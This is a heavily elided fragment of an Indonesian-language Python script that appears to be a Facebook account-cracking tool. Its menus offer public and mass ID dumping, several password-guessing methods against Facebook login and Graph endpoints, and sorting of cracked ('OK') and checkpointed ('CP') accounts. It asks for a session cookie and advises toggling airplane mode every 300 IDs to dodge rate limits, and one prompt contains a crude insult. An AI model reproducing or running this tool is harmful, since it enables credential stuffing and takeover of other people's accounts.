...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(f"""[bold green]___  ____ ____ _   _ ____ _  _ _  _ _  _ 
...
def login_lagi334():
	try:
		...
		banner()
		ses = requests.Session()
		cetak(nel(f'[bold red] WARNING : Disarankan Untuk Tidak Pakai Akun Utama',width=90,style=f"bold yellow"))
		cok = input('\n[+] Masukan Cookie : ')
		ses.headers.update(
			{
...
def menu(my_name,my_id):
	...
	cetak(f"[bold white]1.Crack Publik [bold white]\n2.Crack masal [bold white]\n3.Hasil Crack[bold white]\n4.cek opsi [bold white]\n0.Delete Cookies")
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]\n           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]')
	kz = input(f'╰──[ Pilih : ')
	if kz in ['2','02']:
...
def dump_massal(): 
	...
	cetak('--------------------------------------------------') 
	try:	   
		kumpulkan = int(input(f'\x1b[0m╰──[ Mau Berapa Target : '))
	except ValueError:
	    exit()
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\x1b[0m╰──[ Id Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
...
def dump_publik():
	with requests.Session() as ses:
		...
		try:
			...
			print('Total id : {}'.format(len(id)));setting()
			print('')
		except Exception as e:
			print(e)
...
def setting():   
	cetak('--------------------------------------------------')
	cetak(f'[bold white]1.Idz Old Ke New \n[bold white]2.Idz New Ke Old \n[bold white]3.Idz Random ')
	...
	urut = []
	urut.append('--------------------------------------------------') 
	urut.append(f'\n[bold white]1. VALIDATE [bold green]m.facebook.com[bold white]\n2. VALIDATE [bold green]mbasic.facebook.com[bold white]\n3. REGULAR [bold green]m.facebook.com[bold white]\n4. B-API [bold green]graph.facebook.com[bold white]\n5. ASYNC [bold green]m.facebook.com[bold white]\n6. ASYNC [bold green]alpha.facebook.com[bold white]') 
	...
	if hc in ['1','01']:
		...
		method.append('validate1')
	cetak('--------------------------------------------------') 
	cetak('''[bold white]1.Password V1 [[bold green]Recommended[bold white]]\n2.Password V2 [[bold green]Very Recommended[bold white]]\n3.Password Manual [[bold red]Not Recommended[bold white]]''')
	...
	cetak('--------------------------------------------------') 
	cetak(f'[bold white]TAMPILKAN APK ? Y/T')
	...
	cetak('--------------------------------------------------') 	
	cetak(f'[bold white]TAMPILKAN OPSI CP ? Y/T')
	_brayen_ = input('╰──[ Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	...
	cetak('--------------------------------------------------') 
	cetak(f'[bold white]TAMBAHKAN UA MANUAL ? Y/T')
...
def passwrd():
	...
	print('--------------------------------------------------') 
	urut = []	
	urut.append(f'[bold green]%s [bold white]'%(okc))
	urut.append(f'\n[bold yellow]%s [bold white]'%(cpc))
	wa.print(Columns(urut))
	cetak('--------------------------------------------------') 
	cetak(f'[bold white]On/Off Mode Pesawat Setiap 300 Idz')
	cetak('--------------------------------------------------') 
